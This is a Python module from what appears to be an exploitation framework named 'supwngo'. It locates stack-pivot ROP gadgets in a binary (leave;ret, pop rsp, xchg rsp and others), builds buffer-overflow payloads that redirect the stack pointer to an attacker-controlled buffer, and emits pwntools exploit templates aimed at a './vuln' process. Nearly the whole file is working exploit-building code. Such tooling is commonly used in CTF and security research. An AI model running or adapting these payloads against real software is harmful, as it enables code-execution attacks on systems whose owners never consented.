"""
Stack pivoting techniques for ROP chain execution.

Stack pivoting redirects RSP/ESP to a controlled buffer, allowing
execution of larger ROP chains when the original stack space is limited.
"""

from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Dict, List, Optional, Tuple

from supwngo.core.binary import Binary
from supwngo.core.context import ExploitContext
from supwngo.utils.helpers import p64, p32, flat
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


class PivotType(Enum):
    """Types of stack pivot techniques."""
    LEAVE_RET = auto()        # leave; ret - pivot via saved RBP
    XCHG_RSP = auto()         # xchg rsp, reg; ret - swap RSP with register
    POP_RSP = auto()          # pop rsp; ret - direct RSP control
    ADD_RSP = auto()          # add rsp, offset; ret - relative pivot
    SUB_RSP = auto()          # sub rsp, offset; ret - relative pivot (rare)
    MOV_RSP = auto()          # mov rsp, reg; ret - direct assignment
    PUSH_REG_RET = auto()     # push reg; ret - pivot to register value


@dataclass
class PivotGadget:
    """Represents a stack pivot gadget."""
    address: int
    instructions: str
    pivot_type: PivotType

    # For relative pivots
    offset: int = 0

    # For register-based pivots
    source_reg: Optional[str] = None

    # Requirements
    requires_controlled_reg: bool = False
    requires_controlled_rbp: bool = False

    # Stack adjustment after pivot
    stack_adjustment: int = 0

    def __str__(self) -> str:
        return f"0x{self.address:x}: {self.instructions} ({self.pivot_type.name})"


@dataclass
class PivotPayload:
    """Generated stack pivot payload."""
    payload: bytes
    pivot_address: int
    target_buffer: int
    pivot_type: PivotType
    description: str = ""

    # For building follow-up ROP chain
    rop_chain_offset: int = 0  # Where ROP chain should go in target buffer


class StackPivot:
    """
    Stack pivoting for extended ROP chain execution.

    When buffer overflow is limited (e.g., only control return address + a few bytes),
    stack pivoting redirects RSP to a larger controlled buffer where a full ROP chain
    can be placed.

    Common scenarios:
    - Small stack buffer with heap allocation available
    - Format string wrote ROP chain to BSS, need to pivot there
    - Limited overflow but large environment/argument buffer

    Example usage:
        pivot = StackPivot(binary, context)
        gadgets = pivot.find_pivot_gadgets()

        # Using leave; ret when we control saved RBP
        payload = pivot.build_leave_ret_pivot(
            overflow_offset=64,
            target_buffer=0x601000,  # BSS address with ROP chain
        )
    """

    def __init__(
        self,
        binary: Binary,
        context: Optional[ExploitContext] = None,
    ):
        """
        Initialize stack pivot handler.

        Args:
            binary: Target binary
            context: Optional exploitation context
        """
        self.binary = binary
        self.context = context
        self.bits = binary.bits
        self.pack = p64 if self.bits == 64 else p32
        self.word_size = 8 if self.bits == 64 else 4

        # Cache found gadgets
        self._pivot_gadgets: List[PivotGadget] = []

    def find_pivot_gadgets(self, force_rescan: bool = False) -> List[PivotGadget]:
        """
        Find all stack pivot gadgets in the binary.

        Args:
            force_rescan: Force rescan even if cached

        Returns:
            List of PivotGadget objects
        """
        if self._pivot_gadgets and not force_rescan:
            return self._pivot_gadgets

        gadgets = []

        # Import GadgetFinder for searching
        from supwngo.exploit.rop.gadgets import GadgetFinder
        finder = GadgetFinder(self.binary)
        finder.find_gadgets()

        # Find leave; ret gadgets
        leave_ret = self._find_leave_ret(finder)
        if leave_ret:
            gadgets.extend(leave_ret)

        # Find xchg rsp, reg gadgets
        xchg_gadgets = self._find_xchg_rsp(finder)
        if xchg_gadgets:
            gadgets.extend(xchg_gadgets)

        # Find pop rsp gadgets
        pop_rsp = self._find_pop_rsp(finder)
        if pop_rsp:
            gadgets.extend(pop_rsp)

        # Find add/sub rsp gadgets
        add_sub = self._find_add_sub_rsp(finder)
        if add_sub:
            gadgets.extend(add_sub)

        # Find mov rsp, reg gadgets
        mov_rsp = self._find_mov_rsp(finder)
        if mov_rsp:
            gadgets.extend(mov_rsp)

        # Find push reg; ret gadgets
        push_ret = self._find_push_ret(finder)
        if push_ret:
            gadgets.extend(push_ret)

        self._pivot_gadgets = gadgets
        logger.info(f"Found {len(gadgets)} pivot gadgets")

        return gadgets

    def _find_leave_ret(self, finder) -> List[PivotGadget]:
        """Find leave; ret gadgets."""
        gadgets = []

        g = finder.find_leave_ret()
        if g:
            gadgets.append(PivotGadget(
                address=g.address,
                instructions=g.instructions,
                pivot_type=PivotType.LEAVE_RET,
                requires_controlled_rbp=True,
                stack_adjustment=self.word_size,  # leave pops RBP
            ))

        return gadgets

    def _find_xchg_rsp(self, finder) -> List[PivotGadget]:
        """Find xchg rsp, reg; ret gadgets."""
        gadgets = []

        regs = ['rax', 'rbx', 'rcx', 'rdx', 'rdi', 'rsi', 'r8', 'r9', 'r10', 'r11', 'r12', 'r13', 'r14', 'r15']
        if self.bits == 32:
            regs = ['eax', 'ebx', 'ecx', 'edx', 'edi', 'esi']

        for reg in regs:
            g = finder.find_xchg_rsp(reg)
            if g:
                gadgets.append(PivotGadget(
                    address=g.address,
                    instructions=g.instructions,
                    pivot_type=PivotType.XCHG_RSP,
                    source_reg=reg,
                    requires_controlled_reg=True,
                ))

        return gadgets

    def _find_pop_rsp(self, finder) -> List[PivotGadget]:
        """Find pop rsp; ret gadgets."""
        gadgets = []

        g = finder.find_pop_rsp()
        if g:
            gadgets.append(PivotGadget(
                address=g.address,
                instructions=g.instructions,
                pivot_type=PivotType.POP_RSP,
                stack_adjustment=0,  # RSP comes from stack
            ))

        return gadgets

    def _find_add_sub_rsp(self, finder) -> List[PivotGadget]:
        """Find add/sub rsp, imm gadgets."""
        gadgets = []

        # Search for add rsp gadgets with various offsets
        for g in finder._gadgets.values():
            insns = g.instructions.lower()

            # Match add rsp, 0xNN or add rsp, NN
            if 'add' in insns and ('rsp' in insns or 'esp' in insns):
                import re
                match = re.search(r'add\s+[er]sp\s*,\s*(0x[0-9a-f]+|\d+)', insns)
                if match:
                    offset_str = match.group(1)
                    offset = int(offset_str, 16) if offset_str.startswith('0x') else int(offset_str)

                    gadgets.append(PivotGadget(
                        address=g.address,
                        instructions=g.instructions,
                        pivot_type=PivotType.ADD_RSP,
                        offset=offset,
                    ))

            # Match sub rsp, 0xNN (less common for pivoting)
            if 'sub' in insns and ('rsp' in insns or 'esp' in insns):
                import re
                match = re.search(r'sub\s+[er]sp\s*,\s*(0x[0-9a-f]+|\d+)', insns)
                if match:
                    offset_str = match.group(1)
                    offset = int(offset_str, 16) if offset_str.startswith('0x') else int(offset_str)

                    gadgets.append(PivotGadget(
                        address=g.address,
                        instructions=g.instructions,
                        pivot_type=PivotType.SUB_RSP,
                        offset=offset,
                    ))

        return gadgets

    def _find_mov_rsp(self, finder) -> List[PivotGadget]:
        """Find mov rsp, reg gadgets."""
        gadgets = []

        regs = ['rax', 'rbx', 'rcx', 'rdx', 'rdi', 'rsi', 'rbp']
        if self.bits == 32:
            regs = ['eax', 'ebx', 'ecx', 'edx', 'edi', 'esi', 'ebp']

        for reg in regs:
            g = finder.find_gadget([f"mov rsp, {reg}" if self.bits == 64 else f"mov esp, {reg}"])
            if g:
                gadgets.append(PivotGadget(
                    address=g.address,
                    instructions=g.instructions,
                    pivot_type=PivotType.MOV_RSP,
                    source_reg=reg,
                    requires_controlled_reg=True,
                ))

        return gadgets

    def _find_push_ret(self, finder) -> List[PivotGadget]:
        """Find push reg; ret gadgets for indirect pivoting."""
        gadgets = []

        regs = ['rax', 'rbx', 'rcx', 'rdx', 'rdi', 'rsi']
        if self.bits == 32:
            regs = ['eax', 'ebx', 'ecx', 'edx', 'edi', 'esi']

        for reg in regs:
            g = finder.find_gadget([f"push {reg}", "ret"])
            if g:
                gadgets.append(PivotGadget(
                    address=g.address,
                    instructions=g.instructions,
                    pivot_type=PivotType.PUSH_REG_RET,
                    source_reg=reg,
                    requires_controlled_reg=True,
                ))

        return gadgets

    def get_best_pivot(
        self,
        controlled_regs: Optional[List[str]] = None,
        controlled_rbp: bool = False,
        prefer_type: Optional[PivotType] = None,
    ) -> Optional[PivotGadget]:
        """
        Get the best pivot gadget based on available primitives.

        Args:
            controlled_regs: List of registers we control
            controlled_rbp: Whether we control saved RBP
            prefer_type: Preferred pivot type

        Returns:
            Best matching PivotGadget or None
        """
        gadgets = self.find_pivot_gadgets()

        if not gadgets:
            return None

        controlled_regs = controlled_regs or []

        # Score gadgets based on requirements match
        scored = []
        for g in gadgets:
            score = 0

            # Check if requirements are met
            if g.requires_controlled_rbp and not controlled_rbp:
                continue
            if g.requires_controlled_reg and g.source_reg not in controlled_regs:
                continue

            # Preference scoring
            if prefer_type and g.pivot_type == prefer_type:
                score += 100

            # leave; ret is most common and reliable
            if g.pivot_type == PivotType.LEAVE_RET:
                score += 50

            # pop rsp is very clean
            if g.pivot_type == PivotType.POP_RSP:
                score += 40

            # xchg is also reliable
            if g.pivot_type == PivotType.XCHG_RSP:
                score += 30

            scored.append((score, g))

        if not scored:
            return None

        scored.sort(key=lambda x: x[0], reverse=True)
        return scored[0][1]

    def build_leave_ret_pivot(
        self,
        overflow_offset: int,
        target_buffer: int,
        leave_ret_addr: Optional[int] = None,
        padding: bytes = b"A",
    ) -> PivotPayload:
        """
        Build payload for leave; ret stack pivot.

        The leave instruction does:
            mov rsp, rbp
            pop rbp

        So we overwrite saved RBP with (target_buffer - word_size) to make RSP
        point to our ROP chain after the leave.

        Args:
            overflow_offset: Offset to saved RBP in overflow buffer
            target_buffer: Address of buffer containing ROP chain
            leave_ret_addr: Address of leave; ret gadget (auto-detect if None)
            padding: Padding byte

        Returns:
            PivotPayload with exploit bytes
        """
        if leave_ret_addr is None:
            gadget = self.get_best_pivot(controlled_rbp=True, prefer_type=PivotType.LEAVE_RET)
            if not gadget:
                raise ValueError("No leave; ret gadget found")
            leave_ret_addr = gadget.address

        # Build payload:
        # [padding] [fake_rbp] [leave_ret]
        # fake_rbp = target_buffer - word_size (so after leave, RSP = target_buffer)
        fake_rbp = target_buffer - self.word_size

        payload = bytearray()
        payload.extend(padding * overflow_offset)
        payload.extend(self.pack(fake_rbp))
        payload.extend(self.pack(leave_ret_addr))

        return PivotPayload(
            payload=bytes(payload),
            pivot_address=leave_ret_addr,
            target_buffer=target_buffer,
            pivot_type=PivotType.LEAVE_RET,
            description=f"leave; ret pivot to 0x{target_buffer:x}",
            rop_chain_offset=0,
        )

    def build_pop_rsp_pivot(
        self,
        overflow_offset: int,
        target_buffer: int,
        pop_rsp_addr: Optional[int] = None,
        padding: bytes = b"A",
    ) -> PivotPayload:
        """
        Build payload for pop rsp; ret stack pivot.

        Directly sets RSP from the stack, very clean.

        Args:
            overflow_offset: Offset to return address
            target_buffer: Address where RSP should point
            pop_rsp_addr: Address of pop rsp; ret gadget
            padding: Padding byte

        Returns:
            PivotPayload with exploit bytes
        """
        if pop_rsp_addr is None:
            gadget = self.get_best_pivot(prefer_type=PivotType.POP_RSP)
            if not gadget:
                raise ValueError("No pop rsp gadget found")
            pop_rsp_addr = gadget.address

        # Build payload:
        # [padding] [pop_rsp] [target_buffer]
        payload = bytearray()
        payload.extend(padding * overflow_offset)
        payload.extend(self.pack(pop_rsp_addr))
        payload.extend(self.pack(target_buffer))

        return PivotPayload(
            payload=bytes(payload),
            pivot_address=pop_rsp_addr,
            target_buffer=target_buffer,
            pivot_type=PivotType.POP_RSP,
            description=f"pop rsp pivot to 0x{target_buffer:x}",
            rop_chain_offset=0,
        )

    def build_xchg_rsp_pivot(
        self,
        overflow_offset: int,
        target_buffer: int,
        source_reg: str,
        xchg_addr: Optional[int] = None,
        reg_setup_chain: Optional[bytes] = None,
        padding: bytes = b"A",
    ) -> PivotPayload:
        """
        Build payload for xchg rsp, reg; ret stack pivot.

        Requires the source register to already contain target address.

        Args:
            overflow_offset: Offset to return address
            target_buffer: Desired RSP target
            source_reg: Register containing target (must match gadget)
            xchg_addr: Address of xchg gadget
            reg_setup_chain: Optional ROP chain to set up register
            padding: Padding byte

        Returns:
            PivotPayload with exploit bytes
        """
        if xchg_addr is None:
            gadget = self.get_best_pivot(
                controlled_regs=[source_reg],
                prefer_type=PivotType.XCHG_RSP
            )
            if not gadget:
                raise ValueError(f"No xchg rsp, {source_reg} gadget found")
            xchg_addr = gadget.address

        payload = bytearray()
        payload.extend(padding * overflow_offset)

        # Add register setup chain if provided
        if reg_setup_chain:
            payload.extend(reg_setup_chain)

        payload.extend(self.pack(xchg_addr))

        return PivotPayload(
            payload=bytes(payload),
            pivot_address=xchg_addr,
            target_buffer=target_buffer,
            pivot_type=PivotType.XCHG_RSP,
            description=f"xchg rsp, {source_reg} pivot to 0x{target_buffer:x}",
            rop_chain_offset=0,
        )

    def build_add_rsp_pivot(
        self,
        overflow_offset: int,
        add_offset: int,
        add_rsp_addr: Optional[int] = None,
        padding: bytes = b"A",
    ) -> PivotPayload:
        """
        Build payload for add rsp, N; ret relative pivot.

        Useful when ROP chain is placed at a known offset from current RSP.

        Args:
            overflow_offset: Offset to return address
            add_offset: How much to add to RSP (must match gadget)
            add_rsp_addr: Address of add rsp gadget
            padding: Padding byte

        Returns:
            PivotPayload with exploit bytes
        """
        if add_rsp_addr is None:
            # Find gadget with matching offset
            gadgets = self.find_pivot_gadgets()
            for g in gadgets:
                if g.pivot_type == PivotType.ADD_RSP and g.offset == add_offset:
                    add_rsp_addr = g.address
                    break
            if add_rsp_addr is None:
                raise ValueError(f"No add rsp, 0x{add_offset:x} gadget found")

        payload = bytearray()
        payload.extend(padding * overflow_offset)
        payload.extend(self.pack(add_rsp_addr))

        # Calculate where RSP will end up
        # RSP will be at: current_return_addr + word_size + add_offset

        return PivotPayload(
            payload=bytes(payload),
            pivot_address=add_rsp_addr,
            target_buffer=0,  # Relative pivot, actual target depends on runtime RSP
            pivot_type=PivotType.ADD_RSP,
            description=f"add rsp, 0x{add_offset:x} relative pivot",
            rop_chain_offset=add_offset,
        )

    def build_double_leave_pivot(
        self,
        overflow_offset: int,
        target_buffer: int,
        leave_ret_addr: Optional[int] = None,
        padding: bytes = b"A",
    ) -> PivotPayload:
        """
        Build payload for double leave; ret pivot.

        Sometimes used when we need to pivot through an intermediate buffer.
        First leave sets RSP to fake_rbp1, second leave sets to fake_rbp2's value.

        Args:
            overflow_offset: Offset to saved RBP
            target_buffer: Final target address
            leave_ret_addr: Address of leave; ret gadget
            padding: Padding byte

        Returns:
            PivotPayload with exploit bytes
        """
        if leave_ret_addr is None:
            gadget = self.get_best_pivot(controlled_rbp=True, prefer_type=PivotType.LEAVE_RET)
            if not gadget:
                raise ValueError("No leave; ret gadget found")
            leave_ret_addr = gadget.address

        # For double leave:
        # 1st leave: RSP = RBP, pop RBP (gets fake_rbp1)
        # ret to leave;ret again
        # 2nd leave: RSP = fake_rbp1, pop RBP (gets value at fake_rbp1)

        # This requires:
        # - overflow buffer sets saved RBP to intermediate
        # - intermediate buffer contains pointer to final target - word_size

        fake_rbp = target_buffer - self.word_size

        payload = bytearray()
        payload.extend(padding * overflow_offset)
        payload.extend(self.pack(fake_rbp))
        payload.extend(self.pack(leave_ret_addr))

        return PivotPayload(
            payload=bytes(payload),
            pivot_address=leave_ret_addr,
            target_buffer=target_buffer,
            pivot_type=PivotType.LEAVE_RET,
            description=f"leave; ret pivot to 0x{target_buffer:x}",
            rop_chain_offset=0,
        )

    def generate_pivot_template(
        self,
        pivot_type: PivotType,
        target_buffer: int,
    ) -> str:
        """
        Generate Python code template for stack pivot exploit.

        Args:
            pivot_type: Type of pivot to use
            target_buffer: Target buffer address

        Returns:
            Python exploit template code
        """
        templates = {
            PivotType.LEAVE_RET: '''
# Stack pivot using leave; ret
from pwn import *

binary = ELF('./vuln')
p = process('./vuln')

# Addresses
leave_ret = {leave_ret:#x}
target_buffer = {target:#x}

# Build pivot payload
# leave does: mov rsp, rbp; pop rbp
# So we set saved RBP to (target - 8) to land RSP at target after leave
payload = b"A" * OFFSET_TO_RBP
payload += p64(target_buffer - 8)  # fake RBP
payload += p64(leave_ret)           # return to leave; ret

# ROP chain should already be at target_buffer
p.send(payload)
''',
            PivotType.POP_RSP: '''
# Stack pivot using pop rsp; ret
from pwn import *

binary = ELF('./vuln')
p = process('./vuln')

# Addresses
pop_rsp = {pop_rsp:#x}
target_buffer = {target:#x}

# Build pivot payload
payload = b"A" * OFFSET_TO_RETURN
payload += p64(pop_rsp)
payload += p64(target_buffer)  # RSP = target_buffer after pop

# ROP chain should already be at target_buffer
p.send(payload)
''',
            PivotType.XCHG_RSP: '''
# Stack pivot using xchg rsp, reg; ret
from pwn import *

binary = ELF('./vuln')
p = process('./vuln')

# Addresses
xchg_rsp_rax = {xchg:#x}  # xchg rsp, rax; ret
pop_rax = {pop_rax:#x}
target_buffer = {target:#x}

# Build pivot payload
# First set RAX to target, then xchg
payload = b"A" * OFFSET_TO_RETURN
payload += p64(pop_rax)
payload += p64(target_buffer)
payload += p64(xchg_rsp_rax)

# ROP chain should already be at target_buffer
p.send(payload)
''',
        }

        template = templates.get(pivot_type, "# Pivot type not templated")
        return template.format(
            target=target_buffer,
            leave_ret=0x401000,  # placeholder
            pop_rsp=0x401000,
            xchg=0x401000,
            pop_rax=0x401000,
        )

    def summary(self) -> str:
        """Get pivot gadget summary."""
        gadgets = self.find_pivot_gadgets()

        lines = [
            "Stack Pivot Summary",
            "=" * 40,
        ]

        by_type: Dict[PivotType, List[PivotGadget]] = {}
        for g in gadgets:
            by_type.setdefault(g.pivot_type, []).append(g)

        for ptype, plist in by_type.items():
            lines.append(f"\n{ptype.name}: {len(plist)} gadget(s)")
            for g in plist[:3]:  # Show max 3 per type
                lines.append(f"  0x{g.address:x}: {g.instructions}")

        if not gadgets:
            lines.append("\nNo pivot gadgets found!")

        return "\n".join(lines)


__all__ = [
    "PivotType",
    "PivotGadget",
    "PivotPayload",
    "StackPivot",
]
